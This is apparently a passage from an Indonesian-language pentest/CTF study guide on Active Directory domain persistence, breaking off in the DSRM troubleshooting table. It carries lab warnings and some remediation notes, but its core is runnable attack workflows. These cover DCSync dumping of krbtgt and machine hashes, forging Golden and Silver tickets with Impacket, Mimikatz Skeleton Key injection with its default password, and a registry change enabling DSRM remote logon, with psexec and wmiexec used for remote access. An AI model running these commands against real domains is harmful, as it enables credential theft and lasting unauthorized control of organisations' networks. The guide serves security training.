---
id: "43"
title: "🔐 Workflow 43 — Domain Persistence"
category: "4. Active Directory"
categoryId: "ad"
filename: "43_domain_persistence_workflow.md"
refs_out: ["36","37","38","40","42","44","45"]
refs_in: ["05","12","36","37","39","40","41","42","44","45","46"]
---

# 🔐 Workflow 43 — Domain Persistence

> **Category:** Active Directory / Post-Compromise / Persistence  
> **Difficulty:** Advanced  
> **Type:** Domain Persistence / Credential Forgery / AD Abuse  
> **Prerequisites:**  
> ← [**File 37: Kerberoasting & AS-REP Roasting**](/docs/kerberoasting-asreproasting)  
> ← [**File 40: AD CS**](/docs/adcs)  
> ← [**File 42: Lateral Movement**](/docs/lateral-movement)  
> **Next:**  
> → [**File 44: Linux Privilege Escalation**](/docs/linux-privesc)  
> → [**File 45: Windows Privilege Escalation**](/docs/windows-privesc)

> ⚠️ **CTF vs Real Pentest**
> 
> Hampir semua teknik dalam file ini mengubah authentication, ACL, registry, GPO, certificate, atau directory state. Dalam CTF/lab, perubahan tersebut memang biasanya bagian dari objective pembelajaran. Dalam real pentest, **jangan membuat persistence hanya karena secara teknis bisa**. Harus ada authorization, scope, durasi, cleanup plan, dan bukti perubahan.
> 
> Untuk CTF, setelah memperoleh **Domain Admin atau equivalent**, biasanya objective sebenarnya adalah mengambil flag. Persistence di file ini terutama untuk memahami **mengapa domain compromise dapat bertahan bahkan setelah credential awal berubah**.

---

# 🚀 QUICK START UNTUK PEMULA

Baru pertama kali membaca dokumen Domain Persistence ini? Jangan bingung dengan banyaknya materi! Ikuti alur membaca praktis berikut:

1. **Baca Section 0 (Fondasi)** terlebih dahulu untuk memahami bedanya *Host Persistence* vs *Domain Persistence*.
2. **Fokus ke Section 1 (Golden Ticket)** & **Section 2 (Silver Ticket)** — Dalam 90% skenario CTF / Lab (seperti HTB / TryHackMe), dua teknik inilah yang paling sering diuji dan paling relevan.
3. **Section 3 - 9** dapat dibaca secara bertahap sesuai kebutuhan modul lab atau kasus khusus.
4. **Selalu rujuk Section 10 (Decision Tree)** & **Cheatsheet** sebelum melakukan praktik langsung di lab.

---

# 🎯 0. FONDASI DOMAIN PERSISTENCE

## 0.1 🔑 Apa Itu Domain Persistence?

**Persistence** adalah kemampuan mempertahankan akses setelah kondisi awal yang digunakan untuk masuk sudah berubah.

Misalnya:

```text
INITIAL ACCESS
      │
      ▼
Compromised password
      │
      ▼
Password diganti
      │
      X
   ACCESS LOST
```

Persistence mencoba membuat:

```text
INITIAL ACCESS
      │
      ▼
Persistence Mechanism
      │
      ▼
Password changed
      │
      ▼
ACCESS REMAINS
```

---

# 0.1.1 🏠 Host Persistence vs Domain Persistence

### Host Persistence

Persistence hanya berada pada satu mesin:

```text
┌──────────────────────────────┐
│         WORKSTATION01        │
│                              │
│  Backdoor / Service / Task   │
└──────────────────────────────┘
```

Jika workstation mati:

```text
WORKSTATION01
     │
     ▼
offline
```

persistence tersebut tidak otomatis memberi kontrol ke seluruh domain.

---

### Domain Persistence

Persistence berada pada trust boundary domain:

```text
                 DOMAIN
                    │
        ┌───────────┼───────────┐
        │           │           │
       DC1         DC2         DC3
        │           │           │
        └───────────┼───────────┘
                    │
             Domain Identity
                    │
                    ▼
              Persistence
```

Jika persistence berada pada:

```text
KRBTGT
CA private key
AdminSDHolder
GPO
domain-level credential
```

maka scope-nya bisa jauh lebih besar.

---

# 0.1.2 🗝️ Analogi Nyata — Kunci Master Gedung

Bayangkan sebuah gedung:

```text
Kunci biasa
   │
   ├── lantai 1
   └── lantai 2
```

Manager memiliki:

```text
MASTER KEY
   │
   ├── lantai 1
   ├── lantai 2
   ├── ruang server
   └── ruang keamanan
```

Jika kunci kamar seseorang diganti:

```text
OLD KEY
   X
```

master key tetap dapat bekerja.

Analogi ini mirip dengan beberapa bentuk domain persistence:

```text
Normal credential
      X
      │
      ▼
Persistence mechanism
      │
      ▼
Domain access remains
```

---

# 0.1.3 ⚠️ Persistence Bukan Berarti "Tidak Bisa Dicabut"

Ini asumsi yang harus dihindari.

Persistence:

```text
=
akses yang bertahan lebih lama
```

bukan:

```text
=
akses selamanya
```

Semua persistence dapat memiliki:

```text
detection
revocation
cleanup
key rotation
policy enforcement
```

Contoh:

```text
Golden Ticket
    │
    └── KRBTGT reset
          │
          └── invalidates tickets signed with old key
```

---

# 0.2 🕒 Kapan Domain Persistence Dilakukan?

## 🧪 CTF

Dalam CTF:

```text
Initial Access
     │
     ▼
Privilege Escalation
     │
     ▼
Domain Admin
     │
     ▼
FLAG
```

Persistence biasanya:

```text
OPTIONAL
```

Kamu tidak perlu membuat Golden Ticket hanya untuk:

```text
root.txt
```

---

## 🏢 Real Pentest

Dalam real assessment:

```text
Compromise
   │
   ▼
Potential Persistence
   │
   ▼
Scope / Authorization
   │
   ▼
Explicit Approval
   │
   ▼
Controlled Test
   │
   ▼
Cleanup
```

Karena persistence dapat mengubah:

```text
authentication
access control
GPO
CA
AD objects
registry
```

dan berpotensi mempengaruhi production.

---

# 0.2.1 🔑 Prerequisite Umum

Bergantung teknik, tetapi domain persistence tingkat tinggi umumnya membutuhkan:

```text
a) Domain Admin atau equivalent privilege
b) Access ke Domain Controller / domain infrastructure
c) Credential material yang sesuai
d) Ability to modify relevant AD object/configuration
```

Tidak semua teknik membutuhkan ketiganya secara identik.

Contoh:

```text
Golden Ticket
→ KRBTGT key material

AdminSDHolder
→ write access ke AdminSDHolder

GPO persistence
→ write access ke GPO

Golden Certificate
→ CA private key
```

---

# 0.3 🗂️ Jenis-Jenis Domain Persistence

| Teknik                 | Prerequisite                                        |    Stealth* |                                          Durability | Tool                     | Complexity |
| ---------------------- | --------------------------------------------------- | ----------: | --------------------------------------------------: | ------------------------ | ---------: |
| **Golden Ticket**      | KRBTGT key material + domain SID                    |      Medium |  Sampai key KRBTGT tidak lagi cocok / ticket expire | Impacket/Rubeus/Mimikatz |     Medium |
| **Silver Ticket**      | Service account/computer account key                |        High |          Sampai service key berubah / ticket expire | Impacket/Rubeus/Mimikatz |     Medium |
| **Skeleton Key**       | DA + code execution pada DC                         |         Low |              Sampai DC reboot / modification hilang | Mimikatz                 |       Easy |
| **DSRM Abuse**         | DSRM credential + appropriate DC access             |        High |                    Bergantung account/configuration | Impacket/Windows tools   |     Medium |
| **AdminSDHolder**      | Write privilege ke AdminSDHolder                    | Medium–High |                   Long-lived sampai ACL dibersihkan | PowerView/Impacket       |     Medium |
| **DCShadow**           | High privilege + replication rights/setup           |   Low–High* |          Perubahan AD yang didorong dapat persisten | Mimikatz                 |       Hard |
| **Golden Certificate** | CA private key                                      |  Very High* | Selama CA trust + cert validity/mapping tetap valid | Certipy                  |   Advanced |
| **SID History**        | High privilege + SIDHistory modification capability |      Medium |                 Long-lived sampai attribute dihapus | Mimikatz/LDAP tools      |     Medium |
| **Malicious GPO**      | Write rights terhadap GPO                           |      Medium |                        Sampai GPO/policy diperbaiki | PowerView/SharpGPOAbuse  |     Medium |

* **Stealth bukan sifat absolut.** Detection sangat tergantung logging, EDR, AD auditing, ticket lifetime, identity used, dan environment.

---

# 0.3.1 🧠 Cara Membaca Tabel Persistence

Jangan hanya bertanya:

```text
"Mana yang paling stealth?"
```

Tanyakan:

```text
1. Apa key/credential yang dibutuhkan?
2. Di mana persistence disimpan?
3. Siapa yang dapat mendeteksinya?
4. Berapa lama ia bertahan?
5. Bagaimana cara mencabutnya?
6. Seberapa destructive?
```

---

# 0.4 🧰 Prerequisite Setup

```bash
# Domain Controller IP
export DC_IP="10.10.10.10"

# Active Directory domain
export DOMAIN="domain.local"

# NetBIOS domain name
export DOMAIN_SHORT="DOMAIN"

# Privileged account used in the lab
export USERNAME="administrator"

# Password
export PASSWORD="Password123!"

# Working directory
mkdir -p persistence/{golden,silver,certificates,gpo,dsrm,logs}
```

> **💡 Catatan Penting untuk Pengguna Parrot OS / Kali Linux**:  
> Pada distro modern, script Impacket dapat dipanggil langsung dari mana saja tanpa perlu mengetik path lengkap `python3 /opt/impacket/examples/secretsdump.py`. Anda dapat mengecek ketersediaannya dengan `which secretsdump.py` atau `which impacket-secretsdump`. Jika tersedia, cukup gunakan `secretsdump.py` atau `impacket-secretsdump`.

---

# 🔥 1. GOLDEN TICKET

## 1.1 🧠 Konsep Golden Ticket

Golden Ticket adalah forged Kerberos **Ticket Granting Ticket (TGT)** yang dibuat secara mandiri oleh attacker menggunakan key material milik akun **KRBTGT**. 

KRBTGT adalah akun infrastruktur Active Directory yang digunakan oleh Key Distribution Center (KDC) untuk menandatangani dan menguji keabsahan semua TGT di domain. Karena KDC memverifikasi TGT menggunakan key KRBTGT, siapapun yang memiliki key ini dapat membuat TGT sendiri tanpa perlu berinteraksi dengan KDC untuk otentikasi awal.

```text
                             ACTIVE DIRECTORY DOMAIN
                                        │
                                        ▼
                             Key Distribution Center (KDC)
                                        │
                                        ▼
                             KRBTGT Account Key Material
                                        │
                    ┌───────────────────┴───────────────────┐
                    │                                       │
         Legitimate Process                      Attacker (Golden Ticket)
                    │                                       │
    User sends valid AS-REQ to KDC            Possesses KRBTGT Key offline
                    │                                       │
  KDC signs TGT with KRBTGT key             Forges TGT with arbitrary privileges
                    │                                       │
                    ▼                                       ▼
             Valid Domain TGT                       Forged Domain TGT
```

---

# 1.1.1 🔑 Kenapa KRBTGT Sangat Penting?

Jika attacker memiliki key material KRBTGT:

```text
KRBTGT key
    │
    ▼
Can create Kerberos tickets
    │
    ▼
Represent arbitrary domain identities
```

Karena itu kompromi KRBTGT adalah salah satu indikator paling serius dalam AD.

---

# 1.1.2 🆚 Normal Kerberos vs Golden Ticket

### Normal

```text
CLIENT
  │
  │ AS-REQ
  ▼
KDC
  │
  │ validates identity
  ▼
TGT
  │
  ▼
TGS
  │
  ▼
SERVICE
```

### Golden Ticket

```text
ATTACKER
   │
   │ KRBTGT key
   ▼
FORGE TGT
   │
   │ no normal AS-REQ needed
   ▼
SERVICE REQUEST
   │
   ▼
KDC / SERVICE
   │
   ▼
ACCEPTANCE
```

Nuansa penting:

> Golden Ticket tidak berarti seluruh Kerberos stack "dilewati". Attacker memalsukan TGT sehingga ia dapat menggunakannya dalam subsequent Kerberos operations.

---

# 1.1.3 ⏳ Berapa Lama Golden Ticket Valid?

Sering ada miskonsepsi:

```text
"Golden Ticket default = 10 tahun"
```

Jangan menghafalkan ini sebagai rule.

**Golden Ticket yang forged oleh attacker dapat dibuat dengan lifetime yang dipilih attacker**, dan lifetime efektifnya tetap dipengaruhi oleh service/KDC policy, ticket validation, serta key rotation.

Angka "10 tahun" berasal dari penggunaan ticket forgery dengan lifetime panjang yang sering terlihat pada tooling/lab, bukan aturan AD yang berarti setiap Golden Ticket otomatis valid 10 tahun.

Mental model yang benar:

```text
Golden Ticket lifetime
      │
      ├── forged lifetime
      ├── ticket policy
      ├── validation behavior
      └── KRBTGT key rotation
```

---

# 1.1.4 🔄 Apa yang Terjadi Jika KRBTGT Di-reset?

Misalkan:

```text
Attacker
  │
  └── forge Ticket A
         │
         └── signed with KRBTGT key version A
```

Kemudian password KRBTGT diubah sekali:

```text
KRBTGT
  │
  ▼
new key version
```

Dalam praktik incident response, reset **dua kali** biasanya digunakan agar key version lama dan key material sebelumnya tidak lagi dapat digunakan untuk validasi ticket lama.

Konsep:

```text
OLD KEY
  │
  ▼
Reset #1
  │
  ▼
Previous key still retained for Kerberos transition
  │
  ▼
Reset #2
  │
  ▼
OLD FORGED TICKETS
       X
```

Karena itu:

> **KRBTGT reset dua kali adalah bagian penting remediation Golden Ticket, tetapi timing dan operational impact harus direncanakan.**

---

# 1.2 🔑 Yang Dibutuhkan

Minimal:

```text
KRBTGT key material
+
Domain SID
+
Domain name
```

Kemudian forged identity:

```text
administrator
```

bahkan secara teknis tool forging dapat membuat ticket dengan username yang tidak ada sebagai AD object.

Namun:

> Identity yang dipalsukan tetap harus menghasilkan authorization yang benar-benar berguna pada target.

---

# 1.2.1 📋 Data yang Diperlukan

```text
KRBTGT NT hash
KRBTGT AES key
Domain SID
Domain name
Target username
```

Contoh:

```text
KRBTGT_NTLM = ...
DOMAIN       = domain.local
DOMAIN_SID   = S-1-5-21-...
USERNAME     = administrator
```

---

# 1.3 🧬 Cara Dapatkan KRBTGT Hash

## Impacket — DCSync

```bash
# Request KRBTGT directory credential material
python3 /opt/impacket/examples/secretsdump.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    -just-dc-user "krbtgt"
```

Contoh output:

```text
[*] Dumping Domain Credentials
[*] Using the DRSUAPI method to get NTDS.DIT secrets

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065f6a9ed:::
```

Format:

```text
username
:
RID
:
LM hash
:
NT hash
```

NT hash:

```text
9d765b482771505cbe97411065f6a9ed
```

---

# 1.3.1 🪟 Mimikatz

Di Windows lab:

```text
privilege::debug
lsadump::dcsync /user:krbtgt /domain:domain.local
```

Conceptual output:

```text
Object RDN       : krbtgt
Hash NTLM        : 9d765b...
aes256_hmac      : ...
aes128_hmac      : ...
```

---

# 1.3.2 💾 NTDS.dit

Jika memiliki offline copy dari DC:

```bash
# Read credentials from an offline NTDS.dit plus SYSTEM hive
python3 /opt/impacket/examples/secretsdump.py \
    -ntds "/path/to/ntds.dit" \
    -system "/path/to/SYSTEM" \
    LOCAL |
    grep -i "krbtgt"
```

Output:

```text
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:KRBTGT_HASH:::
```

---

# 1.3.3 🧠 NTLM vs AES Key

Jika tersedia:

```text
RC4 / NT hash
+
AES128
+
AES256
```

maka untuk Kerberos modern, AES key dapat lebih natural daripada RC4.

Namun:

```text
AES = automatically invisible
```

adalah asumsi yang salah.

Defender tetap dapat mendeteksi forged-ticket behavior dari metadata, lifetime, identities, event patterns, dan unusual service access.

---

# 1.4 🆔 Cara Dapatkan Domain SID

## Method 1 — lookupsid

```bash
# Enumerate domain/user SIDs
python3 /opt/impacket/examples/lookupsid.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" |
    head -20
```

Contoh:

```text
[*] Brute forcing SIDs at 10.10.10.10
[*] StringBinding ncacn_np:10.10.10.10[\pipe\lsarpc]
500: DOMAIN\Administrator (SidTypeUser)
512: DOMAIN\Domain Admins (SidTypeGroup)
513: DOMAIN\Domain Users (SidTypeGroup)
```

Domain SID:

```text
S-1-5-21-1111111111-2222222222-3333333333
```

---

# 1.4.1 🧩 Membaca SID

Contoh:

```text
S-1-5-21-1111111111-2222222222-3333333333-500
                                               └── RID
```

Domain SID:

```text
S-1-5-21-1111111111-2222222222-3333333333
```

Administrator default:

```text
RID 500
```

Domain Admins:

```text
RID 512
```

Enterprise Admins:

```text
RID 519
```

---

# 1.4.2 📡 rpcclient

```bash
# Query domain SID
rpcclient \
    -U "$USERNAME%$PASSWORD" \
    "$DC_IP" \
    -c "lsaquery"
```

Contoh:

```text
Domain Name: DOMAIN
Domain Sid: S-1-5-21-1111111111-2222222222-3333333333
```

---

# 1.4.3 🪪 LDAP

```bash
# Query domain object SID
ldapsearch -x \
    -H "ldap://$DC_IP" \
    -D "CN=$USERNAME,CN=Users,DC=domain,DC=local" \
    -w "$PASSWORD" \
    -b "DC=domain,DC=local" \
    "(objectClass=domain)" \
    objectSid
```

---

# 1.5 🎟️ Forge Golden Ticket — Impacket

```bash
# Store required values
export DOMAIN_SID="S-1-5-21-1111111111-2222222222-3333333333"
export KRBTGT_NTLM="KRBTGT_NTLM_HASH"

# PENTING: Untuk otentikasi Kerberos, pastikan Hostname DC terdaftar di /etc/hosts!
# Kerberos bekerja berdasarkan SPN yang terikat pada hostname (bukan IP murni).
echo "$DC_IP  dc01.$DOMAIN  $DOMAIN" | sudo tee -a /etc/hosts

# Forge a TGT for the lab identity
python3 /opt/impacket/examples/ticketer.py \
    -nthash "$KRBTGT_NTLM" \
    -domain-sid "$DOMAIN_SID" \
    -domain "$DOMAIN" \
    "administrator"
```

### 🖥️ Expected Output yang Diharapkan:

```text
[*] Creating golden ticket
[*] User           : administrator
[*] Domain         : domain.local
[*] Domain SID     : S-1-5-21-1111111111-2222222222-3333333333
[*] User ID        : 500
[*] Groups ID      : 513 512 520 518 519 
[*] Extra SIDs     : 
[*] AES256Key      : 
[*] Saving ticket in administrator.ccache
```

> **Tips Troubleshooting**: Jika saat menggunakan ticket muncul error `Encryption type not supported` atau `KRB_AP_ERR_SKEW`, pastikan waktu sistem Anda cocok dengan DC (`sudo rdate -n $DC_IP`) dan pastikan nama domain di resolve melalui `/etc/hosts`.

---

# 1.5.1 🪪 AES Variant

Jika memiliki AES key:

```bash
# Forge using KRBTGT AES256 key
export KRBTGT_AES256="KRBTGT_AES256_KEY"

python3 /opt/impacket/examples/ticketer.py \
    -aesKey "$KRBTGT_AES256" \
    -domain-sid "$DOMAIN_SID" \
    -domain "$DOMAIN" \
    "administrator"
```

---

# 1.5.2 ⏳ Custom Lifetime

Pada lab tertentu, tool dapat mendukung custom lifetime options.

```bash
# Consult the local ticketer syntax before using lifetime options
python3 /opt/impacket/examples/ticketer.py \
    -h
```

Jangan menghafalkan:

```text
10 tahun
```

sebagai default AD behavior.

---

# 1.6 🎫 Gunakan Golden Ticket

Set cache:

```bash
# Use forged Kerberos cache
export KRB5CCNAME="$PWD/administrator.ccache"

# Verify
klist
```

Contoh:

```text
Credentials cache: FILE:/home/user/administrator.ccache
Principal: administrator@DOMAIN.LOCAL

Valid starting       Expires              Service principal
09/08/2026 15:00     09/09/2026 15:00     krbtgt/DOMAIN.LOCAL@DOMAIN.LOCAL
```

---

# 1.6.1 💻 Access melalui SMB

Gunakan hostname/SPN yang benar:

```bash
# Access DC through Kerberos
python3 /opt/impacket/examples/psexec.py \
    -k \
    -no-pass \
    "$DOMAIN/administrator@$TARGET_HOSTNAME"
```

---

# 1.6.2 🧪 WMI

```bash
# Use forged TGT for WMI access
python3 /opt/impacket/examples/wmiexec.py \
    -k \
    -no-pass \
    "$DOMAIN/administrator@$TARGET_HOSTNAME"
```

---

# 1.6.3 🗂️ SMB Client

```bash
# Access C$ using Kerberos
smbclient \
    "//$TARGET_HOSTNAME/C$" \
    -k \
    --no-pass
```

---

# 1.6.4 🧠 Golden Ticket Verification

Jangan hanya:

```text
klist
```

Lakukan:

```text
[ ] Correct realm
[ ] Correct client identity
[ ] krbtgt ticket exists
[ ] Ticket not expired
[ ] Target hostname resolves
[ ] Target SPN exists
[ ] Authorization is actually useful
```

---

# 1.7 🧯 Golden Ticket Troubleshooting

|Error|Penyebab|Solusi|
|---|---|---|
|`Clock skew too great`|Waktu attacker/DC berbeda|Sinkronkan clock|
|`KRB_AP_ERR_MODIFIED`|Wrong key, SPN mismatch, atau wrong target|Verify KRBTGT key + SPN|
|`KDC_ERR_TGT_REVOKED`|Ticket/key version tidak lagi valid setelah KRBTGT rotation|Dapatkan current KRBTGT key pada lab|
|`Encryption type not supported`|Encryption/key mismatch|Gunakan key type yang kompatibel|
|`KDC_ERR_SUMTYPE_NOSUPP`|Sumtype/encryption mismatch|Check supported Kerberos algorithms|
|Hostname resolve gagal|DNS/hosts|Fix `/etc/hosts`/DNS|
|`klist` kosong|Cache salah|Set `KRB5CCNAME`|
|Ticket valid tapi access denied|Authorization/SPN issue|Verify target and privileges|
|Ticket works against one host only|SPN/target mismatch|Use proper FQDN|

---

# 🥈 2. SILVER TICKET

## 2.1 🧠 Konsep Silver Ticket

Perbedaan paling penting:

```text
GOLDEN
=
forged TGT
```

```text
SILVER
=
forged TGS
```

Golden:

```text
KRBTGT key
    │
    ▼
Forge TGT
    │
    ▼
Many service requests
```

Silver:

```text
Service account/computer key
          │
          ▼
      Forge TGS
          │
          ▼
   Specific service
```

---

# 2.1.1 🎯 Mengapa Silver Lebih Terbatas?

Karena ticket dibuat untuk:

```text
specific SPN
```

Contoh:

```text
cifs/FILE01.domain.local
```

bukan seluruh Kerberos realm.

---

# 2.1.2 🕵️ Mengapa Bisa Lebih Stealth?

Secara konsep:

```text
Silver Ticket
    │
    └── service ticket forged locally
          │
          └── may avoid normal TGS request to KDC
```

Akibatnya beberapa KDC-side telemetry tidak muncul seperti flow normal TGT→TGS.

Tetapi:

```text
less KDC traffic
   ≠
undetectable
```

Service-side logs, unusual groups, timestamp anomalies, and invalid authorization behavior tetap dapat terdeteksi.

---

# 2.2 🎯 Common Service Targets

|Service|SPN Format|Possible Access|
|---|---|---|
|CIFS/SMB|`cifs/host.domain.local`|File sharing|
|HTTP|`http/web.domain.local`|Web service|
|MSSQL|`MSSQLSvc/db.domain.local:1433`|SQL service|
|HOST|`host/server.domain.local`|Host-related integrated services|
|WSMAN|`wsman/server.domain.local`|WinRM|
|LDAP|`ldap/dc.domain.local`|LDAP authentication|
|RPCSS|`rpcss/server.domain.local`|RPC-related service|

> Impact tetap ditentukan oleh account/key yang digunakan dan bagaimana service memvalidasi authorization.

---

# 2.3 🔑 Dapatkan Service Account / Computer Account Hash

Jika target service menggunakan computer account:

```bash
# Example: get DC01$ credential material
python3 /opt/impacket/examples/secretsdump.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    -just-dc-user "DC01$"
```

Contoh:

```text
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:COMPUTER_NT_HASH:::
```

---

# 2.3.1 🧠 Service Account Key

Misalnya:

```text
svc_sql
   │
   └── service key
```

maka:

```text
service key
    │
    ▼
forge TGS
    │
    ▼
MSSQLSvc/db.domain.local:1433
```

---

# 2.4 🎟️ Forge Silver Ticket

Contoh CIFS:

```bash
# Service/computer account NT hash
export SERVICE_NTLM="SERVICE_OR_MACHINE_NT_HASH"

# Forge CIFS service ticket
python3 /opt/impacket/examples/ticketer.py \
    -nthash "$SERVICE_NTLM" \
    -domain-sid "$DOMAIN_SID" \
    -domain "$DOMAIN" \
    -spn "cifs/$TARGET_HOSTNAME" \
    "administrator"
```

Output:

```text
[*] Creating service ticket
[*] Saving ticket in administrator.ccache
```

---

# 2.4.1 🌐 HTTP

```bash
# Forge a service ticket for HTTP
python3 /opt/impacket/examples/ticketer.py \
    -nthash "$SERVICE_NTLM" \
    -domain-sid "$DOMAIN_SID" \
    -domain "$DOMAIN" \
    -spn "http/webserver.$DOMAIN" \
    "administrator"
```

---

# 2.4.2 🗄️ MSSQL

```bash
# Forge a service ticket for SQL Server
python3 /opt/impacket/examples/ticketer.py \
    -nthash "$SERVICE_NTLM" \
    -domain-sid "$DOMAIN_SID" \
    -domain "$DOMAIN" \
    -spn "MSSQLSvc/dbserver.$DOMAIN:1433" \
    "sqladmin"
```

---

# 2.5 🗂️ Gunakan Silver Ticket

```bash
# Load forged service ticket
export KRB5CCNAME="$PWD/administrator.ccache"

# Verify cache
klist
```

SMB:

```bash
# Access CIFS service
smbclient \
    "//$TARGET_HOSTNAME/C$" \
    -k \
    --no-pass
```

---

# 2.5.1 ⚠️ Golden vs Silver

||Golden|Silver|
|---|---|---|
|Ticket|TGT|TGS|
|Key|KRBTGT|Service/computer account|
|Scope|Broad|Specific service|
|KDC involvement|Forged TGT can be used for service requests|Forged TGS can avoid normal TGS request|
|Damage radius|Very high|More limited|
|Key requirement|KRBTGT|Service key|

---

# 2.6 🧯 Silver Ticket Troubleshooting

|Error|Penyebab|Solusi|
|---|---|---|
|`KRB_AP_ERR_BAD_INTEGRITY`|Wrong service key|Re-obtain service/computer key|
|Service rejects ticket|Wrong SPN|Check `setspn -L`|
|`KRB_AP_ERR_MODIFIED`|SPN/key mismatch|Check duplicate SPN/key|
|`KDC_ERR_S_PRINCIPAL_UNKNOWN`|SPN tidak ada|Verify exact SPN|
|Access denied|Ticket accepted but authorization invalid|Check service-side privileges|
|Ticket not used|Wrong cache or hostname|`echo $KRB5CCNAME; klist`|

---

# 🗝️ 3. SKELETON KEY

## 3.1 🧠 Konsep

Skeleton Key adalah teknik yang memodifikasi behavior authentication pada DC melalui LSASS/in-memory patching sehingga password khusus dapat bekerja bersamaan dengan password asli.

Konsep:

```text
BEFORE

Administrator
    │
    └── RealPassword
```

Setelah patch:

```text
Administrator
    ├── RealPassword
    └── SkeletonPassword
```

Contoh tool klasik menggunakan:

sebagai skeleton password.

---

# 3.1.1 🏨 Analogi

Bayangkan security guard:

```text
Guard
 │
 ├── checks original key
 └── secretly accepts master code
```

Kunci asli tetap berfungsi.

Kode tambahan juga berfungsi.

---

# 3.1.2 ⚠️ Mengapa Tidak Persistent?

Karena patch berada:

```text
IN MEMORY
```

Jika DC reboot:

```text
LSASS restart
      │
      ▼
Patch lost
```

Jadi:

```text
Skeleton Key
=
temporary persistence
```

bukan:

```text
permanent domain persistence
```

---

# 3.2 💀 Deploy Skeleton Key

> **Lab/CTF only.** Teknik ini menyentuh authentication component pada DC dan dapat mempengaruhi seluruh domain.

Pada Windows dengan privilege yang sesuai:

```text
privilege::debug
misc::skeleton
```

Contoh output konseptual:

```text
Privilege '20' OK
[*] Skeleton Key installed
```

Contoh tool klasik (seperti Mimikatz) menggunakan password default:

```text
mimikatz
```

sebagai skeleton password default untuk melakukan otentikasi ke akun domain manapun setelah patch LSASS disuntikkan.

---

# 3.2.1 🐧 Gunakan dari Linux

Jika lab menggunakan Skeleton Key dengan password default `mimikatz`:

```bash
# Authenticate to SMB using the skeleton password "mimikatz"
python3 /opt/impacket/examples/psexec.py \
    "$DOMAIN/administrator:mimikatz@$DC_IP"
```

atau via WMI:

```bash
# WMI execution dengan skeleton password
python3 /opt/impacket/examples/wmiexec.py \
    "$DOMAIN/administrator:mimikatz@$DC_IP"
```

> Password `mimikatz` adalah nilai historis default pada modul `misc::skeleton`. Jika lab Anda menggunakan custom skeleton password, ganti nilai `mimikatz` sesuai variabel lab Anda.

---

# 3.3 🧪 Keterbatasan

```text
[ ] In-memory
[ ] Reboot removes it
[ ] LSASS modification
[ ] Very noisy to EDR
[ ] Requires high privilege
[ ] Authentication path dependent
```

---

# 🗄️ 4. DSRM ABUSE

## 4.1 🧠 Apa Itu DSRM?

**Directory Services Restore Mode (DSRM)** adalah mode recovery khusus Domain Controller.

Ada account local Administrator khusus untuk DSRM.

Mental model:

```text
DC
 │
 ├── Normal AD operation
 │
 └── DSRM recovery account
```

Ini bukan:

```text
DOMAIN\Administrator
```

melainkan:

```text
DC01\Administrator
```

---

# 4.1.1 🚪 Analogi Pintu Darurat

Bayangkan gedung punya:

```text
MAIN DOOR
   │
   └── normal employees

EMERGENCY DOOR
   │
   └── recovery/security staff
```

DSRM adalah semacam jalur recovery.

Jika credential DSRM terekspos dan konfigurasi remote logon memungkinkan:

```text
DSRM credential
    │
    ▼
DC local authentication
```

---

# 4.2 🔑 Dump DSRM Credential

DSRM adalah **local account**, sehingga jangan menganggap `-just-dc` saja akan otomatis memberi password DSRM.

Dalam lab, credential DSRM dapat dianalisis melalui local SAM/security secrets sesuai metode yang tersedia pada environment.

Contoh:

```bash
# Dump local SAM material from the DC
python3 /opt/impacket/examples/secretsdump.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    -sam
```

Jika setup/credential source mendukungnya:

```bash
# Dump registry-based local credential material
python3 /opt/impacket/examples/secretsdump.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP"
```

Contoh output yang dicari:

```text
[*] Dumping local SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:DSRM_NT_HASH:::
```

> Dalam beberapa konfigurasi, DSRM hash dapat disimpan/diakses melalui recovery/security data yang berbeda. Jangan mengasumsikan output tertentu selalu identik pada semua DC.

---

# 4.2.1 🧠 Domain Administrator vs DSRM Administrator

```text
DOMAIN\Administrator
        │
        └── AD account

DC01\Administrator
        │
        └── local DSRM/recovery account
```

Ini dua security principals yang berbeda.

---

# 4.3 ⚙️ Enable DSRM Remote Logon

Pada environment lab yang memang menguji teknik ini, nilai:

```text
DSRMAdminLogonBehavior
```

digunakan untuk menentukan behavior remote logon DSRM.

Contoh query:

```bash
# Query the DSRM remote logon behavior setting
python3 /opt/impacket/examples/reg.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    query \
    'HKLM\System\CurrentControlSet\Control\Lsa' \
    -v DSRMAdminLogonBehavior
```

Pada lab, setting yang mengizinkan remote DSRM administration biasanya:

```text
2
```

---

# 4.3.1 🛑 WARNING

Mengubah:

```text
DSRMAdminLogonBehavior
```

adalah perubahan security-sensitive pada DC.

Dalam real assessment:

```text
approval
+
change window
+
cleanup
```

harus ada.

---

# 4.3.2 🐧 Set Registry pada Lab

```bash
# Enable the DSRM remote-logon behavior in the lab
python3 /opt/impacket/examples/reg.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    add \
    'HKLM\System\CurrentControlSet\Control\Lsa' \
    -v DSRMAdminLogonBehavior \
    -vt REG_DWORD \
    -vd 2
```

Verify:

```bash
# Verify registry setting
python3 /opt/impacket/examples/reg.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    query \
    'HKLM\System\CurrentControlSet\Control\Lsa' \
    -v DSRMAdminLogonBehavior
```

Contoh:

```text
DSRMAdminLogonBehavior
REG_DWORD
0x2
```

---

# 4.4 🔐 Login with DSRM Credential

Gunakan **local DC identity**, bukan domain identity.

```bash
# Use the DSRM local Administrator account
python3 /opt/impacket/examples/psexec.py \
    -hashes ":$DSRM_NTLM_HASH" \
    "DC01/Administrator@$DC_IP"
```

Konsep:

```text
DC01\Administrator
        │
        ▼
local DC authentication
        │
        ▼
DC access
```

---

# 4.4.1 ❗ Common Mistake

Salah:

```text
DOMAIN\Administrator
```

Benar untuk DSRM:

```text
DC01\Administrator
```

karena account tersebut berada pada local security context DC.

---

# 🧯 4.5 DSRM Troubleshooting

|Error|Penyebab|Solusi|
|---|---|---|
|`Access denied` saat registry|Tidak punya local admin rights|Gunakan authorized privileged lab account|
